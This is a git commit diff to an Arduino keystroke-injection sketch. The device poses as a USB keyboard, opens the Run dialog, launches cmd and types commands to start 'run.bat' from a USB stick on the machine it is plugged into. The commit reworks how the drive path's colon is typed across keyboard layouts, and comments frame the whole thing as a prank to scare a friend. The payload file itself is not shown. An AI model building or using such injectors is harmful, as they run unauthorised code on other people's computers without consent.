648bd7f5ad8e40463c967d00f38ca443a5f288ed
Nyamogus <191276298+Nyamogus@users.noreply.github.com>
2025-04-19 02:06:55 +0200

    Update Arduino.ino

--- Arduino.ino
+++ Arduino.ino
@@ -20,6 +20,12 @@ void loop()
   Keyboard.releaseAll();        // Release keys after "run" is launched
   Keyboard.println("cmd");      // Lanch cmd
   delay(500);                   // Wait for cmd to start up (Increase if you're using Potato PCs)
-  Keyboard.println("D:\run.bat");  // Lanch run.bat (For now it's optimized for the use with a seperate USB stick to launch the payload)
+  // Lanch run.bat (For now it's optimized for the use with a seperate USB stick to launch the payload)
+  Keyboard.print("D");              // Type USB drive letter into cmd
+  Keyboard.press(KEY_LEFT_SHIFT);   // Press Shift 
+  Keyboard.press('.');              // Type ":" into cmd
+  delay(100);
+  Keyboard.releaseAll();
+  Keyboard.println("run.bat");      //start run.bat
   delay(1000);    // Your time to laugh as you just scared your friend
 }
